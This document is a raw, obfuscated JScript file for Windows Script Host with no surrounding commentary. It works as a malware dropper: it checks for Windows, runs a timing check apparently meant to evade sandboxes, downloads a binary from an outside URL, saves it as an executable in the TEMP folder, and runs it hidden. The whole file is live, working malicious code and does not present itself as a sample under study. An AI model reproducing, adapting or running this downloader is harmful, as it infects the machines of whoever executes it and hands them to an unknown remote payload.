var J = false;
var Y = "CreateObject";
var r1 = function Jy() {return WScript[Y]("WScript.Shell");}(), BH = 11;
var Cg = "MSXML2.XMLHTTP";
var N0 = 2123213;
var IK = 0;
function r(j){r1["Run"](j, IK, IK);};
function X(){return "" + Cg;};
function tx(j0, o){IK = IK * 1; return j0 - o;};
function gX(){return Y;};
/*@cc_on
  @if (@_win32 || @_win64)
    J = true;
  @end
@*/
if (J)
{
var eg = "";
function xr(){return 22;};
var Yq = 0; var R = 0;
function Xw()
{
var u = new this["Date"]();
var oF = u["getUTCMilliseconds"]();
WScript["Sleep"](xr());
var u = new this["Date"]();
var Vh = u["getUTCMilliseconds"]();
WScript["Sleep"](xr());
var u = new this["Date"]();
var N = u["getUTCMilliseconds"]();
var Yq = "M";
Yq = tx(Vh, oF);
var R = "r0";
R = tx(N, Vh);
eg = "open";
return tx(Yq, R);
}
var G = false;
var E = false;
for (var h = IK; h < xr() * 1; h++){if (Xw() != IK){
G = true; 
R = "31" + 11 * Yq + R; 
E = true; 
break;
}}
function Q() {return ((G == true) && (G == E)) ? 1 : IK;};
if (G && Q() && E){
function Xp() {return r1["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "1r54vDZNq87N.exe";};
 v = X();
 F = WScript[Y](v);
 var Qb = 1;
 while (Qb){
try {
F[eg]("GET", "http://shippedmedicalsupplies.com/n5ids", false);
F["send"]();
D = "Sleep";
for (;;){WScript[D](xr() * 11); if (F["readystate"] >= 2 * 2) break;};
Qb = IK;
} catch(s){};
}
function A(AM) {var ZK = (1, 2, 3, 4, 5, AM); return ZK;};
S = WScript[gX()]("ADODB.Stream");
v = S;
v[eg]();
v["type"] = A(1);
v["write"](F["ResponseBody"]);
S["position"] = A(IK);
v["Save" + "ToFile"](Xp(), 2);
S["c"+"lose"]();
k = Xp();
r(k);
}
}

